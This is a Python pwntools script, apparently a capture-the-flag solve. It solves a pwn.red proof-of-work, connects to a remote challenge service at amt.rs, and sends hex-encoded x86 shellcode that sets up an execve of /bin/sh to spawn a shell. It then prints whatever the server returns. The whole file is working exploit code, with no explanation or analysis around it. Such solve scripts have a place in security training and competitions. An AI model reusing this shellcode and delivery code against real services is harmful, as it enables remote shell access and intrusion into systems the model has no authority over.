#!/usr/bin/env python3
from pwn import *
import base64
import re

def solve_pwn_red_pow(challenge):
    """Solve pwn.red PoW"""
    parts = challenge.split('.')
    difficulty = int.from_bytes(base64.b64decode(parts[1]), 'big')
    challenge_bytes = base64.b64decode(parts[2])

    mod = (1 << 1279) - 1
    exp = 1 << 1277
    x = int.from_bytes(challenge_bytes, 'big')

    for _ in range(difficulty):
        x = pow(x, exp, mod)
        x ^= 1

    solution_bytes = x.to_bytes((x.bit_length() + 7) // 8, 'big')
    return 's.' + base64.b64encode(solution_bytes).decode()

payload = "b85570330180008d40800040682f736800682f62696e89e3b80b000000b900000000ba00000000e9240000004048404840484048404840484048404840484048404840484048404840484048404840484040ebfe"

log.info("Connecting...")
io = remote('amt.rs', 57207)

# PoW
pow_data = io.recvuntil(b'solution: ').decode()
match = re.search(r's\.[A-Za-z0-9+/=]+\.[A-Za-z0-9+/=]+', pow_data)
if match:
    solution = solve_pwn_red_pow(match.group(0))
    io.sendline(solution.encode())
    log.success("PoW sent")

# Wait and see what we get
try:
    data = io.recv(timeout=3)
    log.info(f"Received after PoW ({len(data)} bytes):")
    print(data.decode(errors='ignore'))
    print(repr(data))
except Exception as e:
    log.error(f"Error after PoW: {e}")
    io.close()
    exit(1)

# Send shellcode
log.info("Sending shellcode...")
io.sendline(payload.encode())

# Get all output
log.info("Receiving all output...")
try:
    while True:
        data = io.recv(timeout=2)
        if not data:
            break
        print(data.decode(errors='ignore'), end='')
except EOFError:
    log.warning("Connection closed by server")
except:
    pass

io.close()
